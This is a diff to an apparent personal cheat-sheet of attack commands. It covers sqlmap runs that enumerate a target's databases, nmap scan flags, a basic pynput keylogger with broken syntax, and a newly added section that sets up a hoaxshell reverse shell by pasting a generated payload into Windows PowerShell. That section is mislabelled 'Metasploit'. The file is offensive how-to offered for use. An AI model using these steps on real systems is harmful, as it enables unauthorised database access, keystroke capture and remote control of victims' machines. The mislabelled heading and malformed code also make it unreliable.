@@ -1,4 +1,4 @@
-SQL injection
+#SQL injection
 1)git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 2)python sqlmap.py -h
 3)python sqlmap.py -u <url> --batch --dbs
@@ -8,14 +8,14 @@ SQL injection
 
 
 
-Port scanning using NMAP
+#Port scanning using NMAP
 nmap -sA ip
 nmap -sS ip
 nmap -sF ip
 nmap -sN ip
 nmap -sX ip
 
-keylogger
+#keylogger
 from pynput import keyboard
 def keyPressed(key):
     print(str(key)
@@ -29,6 +29,15 @@ if__name__=="__main__":
   listener=keyboard.Listener(on_press=keyPressed)
   listener.start()
       input()
+
+#Metasploit
+git clone https://github.com/t3l3machus/hoaxshell.git
+cd hoaxshell
+pip3 install -r requirements.txt
+ifconfig
+copy inet addr of eth0
+python3 hoaxshell.py -s <paste copied inet addr ip> -cm
+copy payload and paste into windows powershell
 
 
 
